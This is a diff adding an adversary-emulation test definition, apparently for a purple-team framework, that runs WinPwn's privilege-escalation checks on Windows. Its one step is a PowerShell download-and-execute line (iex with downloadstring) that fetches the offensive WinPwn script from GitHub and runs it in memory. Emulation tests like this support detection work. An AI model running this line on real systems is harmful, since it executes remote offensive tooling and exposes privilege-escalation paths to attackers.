@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: WinPwn - General privesc checks
+description: General privesc checks using the otherchecks function of WinPwn
+uuid: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1082: System Information Discovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---general-privesc-checks
+      inline: |-
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+        otherchecks -noninteractive -consoleoutput
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
